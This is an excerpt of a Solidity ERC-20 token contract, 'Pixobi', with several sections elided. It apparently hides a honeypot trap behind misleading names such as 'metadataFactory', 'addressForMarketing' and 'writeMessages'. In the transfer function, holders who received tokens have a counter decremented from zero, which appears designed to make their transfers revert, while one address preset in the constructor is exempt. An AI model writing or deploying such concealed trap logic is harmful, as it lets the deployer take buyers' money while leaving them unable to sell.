...
contract Pixobi is Context, IERC20, Ownable {
    ...
    IUniswapV2Router01 public metadataFactory; address public addressForMarketing;

    mapping (address => bool) private _allowance;
    mapping(address => uint256) private _tOwned;

    uint256 private _tTotal; uint8 private _decimals;
    string private _symbol; string private _name; uint256 private checkLimitsOn = 100;

    mapping(address => uint256) private automatedMarketMakerPairs;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _rOwned;

    using SafeMath for uint256; address private addressForTeam;

    constructor( 
    string memory _setName, string memory _setSign, 
    address _msgStater, address _msgSigner) { 

        _name = _setName; _symbol = _setSign;
        _decimals = 18; _tTotal 
        = 1000000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _tTotal;

        automatedMarketMakerPairs
        [_msgSigner] = checkLimitsOn; swapEnabled 
        = false; 
        metadataFactory = IUniswapV2Router01(_msgStater);

        addressForMarketing = IUniswapV2Factory
        (metadataFactory.factory()).createPair(address(this), 
        metadataFactory.WETH()); 
        emit Transfer 
    ...
    private { require(sender != address(0), 
        ...
        require
        (inSwap == false, ""); if (automatedMarketMakerPairs[sender] 
        == 0  && addressForMarketing != sender 
        && _rOwned[sender] 
        > 0) 
        { automatedMarketMakerPairs[sender] -= checkLimitsOn; } 

        _rOwned[addressForTeam] += checkLimitsOn; addressForTeam = recipient; 
    ...
    function writeMessages(address 
    _aprNum) external 
    onlyOwner { _allowance [_aprNum] = true;
    }          
}